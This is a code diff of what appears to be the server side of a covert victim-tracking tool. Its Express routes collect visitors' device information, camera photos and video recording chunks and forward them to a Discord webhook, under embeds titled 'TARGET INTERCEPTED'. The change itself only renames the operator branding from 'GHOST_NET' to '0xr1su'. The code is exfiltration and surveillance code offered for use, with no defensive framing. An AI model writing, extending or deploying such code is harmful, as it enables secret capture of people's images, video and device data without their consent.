@@ -134,7 +134,7 @@ async function discordSendFile(
 ): Promise<void> {
   try {
     const boundary = `DCB${Date.now()}`;
-    const jsonPart = JSON.stringify({ username: "GHOST_NET", embeds: [embed] });
+    const jsonPart = JSON.stringify({ username: "0xr1su", embeds: [embed] });
     const parts: Buffer[] = [
       Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\nContent-Type: application/json\r\n\r\n${jsonPart}\r\n`),
       Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="files[0]"; filename="${filename}"\r\nContent-Type: ${contentType}\r\n\r\n`),
@@ -469,7 +469,7 @@ router.post("/visits/deviceinfo", async (req, res) => {
       title: "🎯 TARGET INTERCEPTED",
       color: DISCORD_COLOR,
       fields: fields.slice(0, 25), // Discord limit
-      footer: { text: `GHOST_NET • ${time}` },
+      footer: { text: `0xr1su • ${time}` },
       timestamp: new Date().toISOString(),
     };
 
@@ -519,7 +519,7 @@ router.post("/visits/deviceinfo", async (req, res) => {
       });
     }
 
-    await discordSendJSON(dcHook, { username: "GHOST_NET", avatar_url: "https://i.imgur.com/4M34hi2.png", embeds: embedList.slice(0, 10) });
+    await discordSendJSON(dcHook, { username: "0xr1su", avatar_url: "https://i.imgur.com/4M34hi2.png", embeds: embedList.slice(0, 10) });
   }
 
   return res.status(200).json({ ok: true });
@@ -560,7 +560,7 @@ router.post("/visits/photo", async (req, res) => {
       color: DISCORD_COLOR,
       description: caption,
       image: { url: "attachment://photo.jpg" },
-      footer: { text: `GHOST_NET • ${time}` },
+      footer: { text: `0xr1su • ${time}` },
       timestamp: new Date().toISOString(),
     };
     await discordSendFile(dcHook, buffer, "photo.jpg", "image/jpeg", embed);
@@ -609,7 +609,7 @@ router.post("/visits/videochunk", async (req, res) => {
       title: `🎥 ${label} RECORDING${isFinal ? " [FINAL]" : ""}`,
       color: DISCORD_COLOR,
       description: `Chunk #${index} • ${isMP4 ? "MP4" : "WebM"}`,
-      footer: { text: `GHOST_NET • ${time}` },
+      footer: { text: `0xr1su • ${time}` },
       timestamp: new Date().toISOString(),
     };
     await discordSendFile(dcHook, buffer, `chunk_${index}.${ext}`, mimeType ?? "video/mp4", embed);
